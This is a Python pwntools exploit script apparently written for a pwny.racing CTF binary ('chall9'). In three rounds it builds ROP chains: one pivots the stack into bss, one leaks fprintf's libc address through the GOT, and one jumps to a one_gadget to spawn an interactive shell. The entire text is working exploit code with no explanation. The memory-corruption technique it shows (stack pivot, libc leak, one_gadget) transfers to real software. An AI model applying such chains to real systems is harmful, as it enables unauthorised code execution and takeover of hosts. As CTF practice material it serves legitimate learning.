from pwn import *
from IPython import embed
import re


context.terminal = ["gnome-terminal", "-e"]
context.arch = "amd64"


p = process("./chall9")

elf  = ELF("./chall9")
libc = ELF("./libc-2.27.so")

entry_ptr_ptr  = 0x400018 # -> "\x40\x09\x40\x00"
sprintf_plt    = 0x400920
entry          = 0x400940
main           = 0x400c73
pop_rsp        = 0x400ecd # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
pop_rsi_r15    = 0x400ed1
pop_rdi        = 0x400ed3
fmt_str        = 0x4015cc # "%s"

bss            = 0x603000

stack_bottom   = bss - 0x100


# =======================
# Round 1, move the stack
# =======================

p.send("A"*0x400)
p.send("\x18")

rop = flat([
    pop_rdi, stack_bottom - 0x8,
    pop_rsi_r15, entry_ptr_ptr, 0,
    sprintf_plt,
    pop_rsp, stack_bottom - 0x8 - 0x18,
])

p.send(rop)
p.send("\n") # Exec rop chain, return to main

p.recvuntil("file: ")
p.recvuntil("file: ")

# ================================
# Round 2, stack at known location
# ================================

fprintf_plt      = 0x4008b0
stdout_ptr_ptr   = 0x602020
stdout_on_stack  = 0x602e60  # Where to write stdout ptr onto the stack
fprintf_got      = 0x601fa8

p.send("A"*0x400)
p.send("\x18")

rop = flat([

    # Write stdout ptr to stack
    pop_rdi, stdout_on_stack,
    pop_rsi_r15, stdout_ptr_ptr, 0,
    sprintf_plt,

    # Print the address of fprintf
    pop_rdi, 0x424242424242, # this will get overwritten by the sprintf above
    pop_rsi_r15, fprintf_got, 0,
    fprintf_plt,

    pop_rdi, 0,
    main,
])

p.send(rop)
p.send("\n")

s = p.recvuntil("pwny.racing presents...")
m = re.search("file not found.\n(.*?) +pwny.racing presents", s)
fprintf_libc = u64(m.group(1) + "\0\0")

libc.address = fprintf_libc - libc.sym["fprintf"]

# ====================
# Round 3, libc leaked
# ====================

one_gadget = libc.address + 0x4f2c5  # constraint: rcx=NULL
print(one_gadget)
ret        = 0x40082e

p.send("A"*0x400)
p.send("\x18")

rop = flat([
    ret,
    one_gadget,
])

p.send(rop)
p.send("\n")
p.recvuntil("file not found.\n")

log.info("Got shell")

p.interactive()
